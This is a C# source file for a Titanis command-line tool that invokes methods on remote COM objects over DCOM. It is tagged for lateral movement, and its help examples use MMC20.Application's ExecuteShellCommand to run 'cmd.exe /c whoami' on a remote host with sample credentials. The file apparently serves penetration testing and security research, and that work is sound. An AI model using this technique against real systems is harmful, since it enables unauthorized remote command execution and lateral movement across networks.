using System.ComponentModel;
using System.Net;
using Titanis.DceRpc;
using Titanis.DceRpc.Client;
using Titanis.Msrpc.Msdcom;
using Titanis.Net;
using Titanis.Security;

namespace Titanis.Cli.DcomTool;

/// <task category="DCOM;Lateral Movement">Invoke a method on a COM object on a remote computer</task>
[Command]
[Description("Invokes a method on an OLE automation object over DCOM")]
[DetailedHelpText(@"{0} activates the object with the specified CLSID and attempts to invoke the specified method.  The arguments are not parsed locally and are all passed as strings.  It is up to the server to coerce them to the correct type.  Most implementations rely on OLE automation to do this.

The -MethodName may specify either a method or a property.  If it is a property, the value of the property is retrieved and printed.

If the method is specified as a dot-separated multi-part name, this is interpreted as a property path.  The properties are retrieved one by one.  The last part is interpreted as the actual name of the method to invoke on the resulting object.")]
[Example("Invoke MMC20 ExecuteShellCommand", "{0} LUMON-FS1 -UserName milchick@LUMON -Password Br3@kr00m! 49B2791A-B1AE-4C90-9B8E-E860BA07F889 Document.ActiveView.ExecuteShellCommand \"cmd.exe\" C:\\ \" /c whoami\" \"\"", "The CLSID corresponds to MMC20.Application.  This object is activated, then the properties Document and retrieved ActiveView, and finally ExecuteShellCommand is executed on the ActiveView object.", Tag = "milchickNtlm_Mmc20Exec")]
[Example("Invoke MMC20 ExecuteShellCommand with FQDN", "{0} LUMON-FS1.lumon.ind -UserName milchick@LUMON -Password Br3@kr00m! -Kdc LUMON-DC1 49B2791A-B1AE-4C90-9B8E-E860BA07F889 Document.ActiveView.ExecuteShellCommand \"cmd.exe\" C:\\ \" /c whoami\" \"\"", "The CLSID corresponds to MMC20.Application.  This object is activated, then the properties Document and retrieved ActiveView, and finally ExecuteShellCommand is executed on the ActiveView object.", Tag = "milchickKerb_Mmc20Exec_fqdn")]
public class InvokeCommand : Command, IHaveServerName
{
	[ParameterGroup(ParameterGroupOptions.AlwaysInstantiate)]
	public RpcParameterGroup? RpcParameters { get; set; }

	private string _serverName;
	[Parameter(0)]
	[Mandatory]
	[Description("Name of the server to connect to")]
	public string ServerName { get => _serverName; set => _serverName = value; }

	[ParameterGroup(ParameterGroupOptions.Required)]
	public ActivationParameterGroup ActivationParameters { get; set; }

	[Parameter(After = nameof(ActivationParameterGroup.Clsid))]
	[Mandatory]
	[Description("Name of method to invoke")]
	public string MethodName { get; set; }

	[Parameter(After = nameof(MethodName))]
	[Description("Arguments to pass to the method")]
	public string[]? Arguments { get; set; }

	//[Parameter(After = nameof(Clsid))]
	//[Description("IID of automation interface")]
	//public Guid Iid { get; set; }

	public const int WellKnownTcpPort = 135;

	protected override void ValidateParameters(ParameterValidationContext context)
	{
		base.ValidateParameters(context);
		this.RpcParameters.ValidateParameters(context, null, ref this._serverName);
	}

	protected override async Task<int> RunAsync(CancellationToken cancellationToken)
	{
		var rpcClient = this.CreateRpcClient();
		this.RpcParameters?.ApplyTo(rpcClient, RpcAuthLevel.PacketIntegrity);

		DcomClient dcom = await DcomClient.ConnectTo(this.ServerName, rpcClient, cancellationToken, callback: new DcomLogger(this.Log));

		var obj = await dcom.Activate(this.ActivationParameters.Clsid, cancellationToken, fileName: this.ActivationParameters.FileName);
		string methodName = this.MethodName;
		int isep = methodName.LastIndexOf('.');
		if (isep != -1)
		{
			var pathParts = methodName.Substring(0, isep).Split('.', StringSplitOptions.RemoveEmptyEntries);

			foreach (var prop in pathParts)
			{
				this.WriteVerbose($"Getting property '{prop}'");
				var propValue = await obj.InvokeMethod(prop, Array.Empty<string>(), cancellationToken);

				if (propValue is OleAutomationObject oleauto)
					obj = oleauto;
				else
				{
					this.WriteError($"The property '{prop}' did not return an automation object.  It returned a {(prop is null ? "<null>" : prop.GetType().FullName)}' with value '{prop}'.");
				}
			}
			methodName = this.MethodName.Substring(isep + 1);
		}

		var result = await obj.InvokeMethod(methodName, this.Arguments ?? Array.Empty<string>(), cancellationToken);

		if (result != null)
			this.WriteRecord(result);
		else
			this.WriteMessage($"Method invoked and returned <null>.");

		return 0;
	}
}
